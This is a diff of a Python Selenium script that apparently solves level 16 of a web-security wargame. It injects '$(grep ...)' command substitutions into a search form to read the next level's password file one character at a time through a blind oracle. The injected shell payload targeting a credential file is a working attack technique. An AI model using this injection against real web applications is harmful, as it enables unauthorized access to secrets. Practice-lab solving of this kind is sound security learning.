@@ -12,7 +12,6 @@ from common import *
 def solve(driver, last_password):
     driver.get(build_url(level=16))
     
-    unknown_caps_letters = []
     password = ""
     for x in range(len(last_password)): # all passwords are the same length
         # ask for words starting with the x letter of the password
@@ -41,33 +40,22 @@ def solve(driver, last_password):
             letter = results[0][0]
             # now we need to find if it's capital or lowercase. empty result means
             base_word = "blubbers"  # if any letter comes after it, it's not in the dictionary, i checked.
+            position_string = "{" + str(x) + "}"
             
-            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^{base_word}$(grep {letter.lower()} {build_webpass_path(17)})')
+            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^{base_word}$(grep ^{position_string}{letter.lower()} {build_webpass_path(17)})')
             driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
             
             WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
             results1 = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
             
-            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^{base_word}$(grep {letter.upper()} {build_webpass_path(17)})')
-            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
-            
-            WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
-            results2 = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
-            
-            if len(results1) == 0 and len(results2) == 0:
-                # unknown, both upper and lowercase are in the password
-                unknown_caps_letters.append(letter)
-                password += letter  # just add the letter to the password, we'll figure it out later
-            elif len(results1) == 0:
-                # lowercase
+            if len(results1) == 0:
+                # it's lowercase
                 password += letter.lower()
             else:
-                # uppercase
                 password += letter.upper()
             
         print("password: ", password, end = '\r')
     print()
-    print("unknown caps letters: ", unknown_caps_letters)
     
     driver.get(build_url(password = password, level=17))
     return password
